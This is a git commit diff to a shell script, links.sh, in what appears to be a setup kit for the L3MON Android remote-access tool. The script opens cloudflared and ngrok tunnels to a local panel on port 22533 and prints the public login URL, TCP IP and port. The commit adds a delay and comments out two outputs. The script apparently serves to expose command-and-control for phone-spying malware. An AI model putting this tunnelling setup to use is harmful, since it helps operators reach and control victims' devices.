f2e0a4a094d6afee7f2b7b41a4c5521a0319265c
Tech EFX Tv <59799893+efxtv@users.noreply.github.com>
2025-01-09 19:12:47 +0530

    Update links.sh

--- bin/ngrok/links.sh
+++ bin/ngrok/links.sh
@@ -14,17 +14,17 @@ clear='\033[0m'
 chmod +x /L3MON/ngrok/cloudflared-linux-amd64 > /dev/null &
 echo > /L3MON/ngrok/.cf.log > /dev/null &
 /L3MON/ngrok/cloudflared-linux-amd64 tunnel -url 127.0.0.1:22533 --logfile /L3MON/ngrok/.cf.log > /dev/null 2>&1 &
-
+sleep 8
 /L3MON/ngrok/ngrok start --all > /dev/null &
 sleep 8
 cdf=$(cat /L3MON/ngrok/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
-brows=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep https)
-links=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0].public_url|grep tcp)
+#brows=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep https)
+#links=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0].public_url|grep tcp)
 ip=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|grep io|sed 's#^#host #g'|bash|awk '{print $NF}')
 port=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|tail -1)
 
 echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $cdf"
-echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $brows"
-echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan TCP  $Green        =$IYellow $links"
+#echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $brows"
+#echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan TCP  $Green        =$IYellow $links"
 echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan IP   $Green        =$IYellow $ip"
 echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan VPORT$Green        =$IYellow $port $clear"
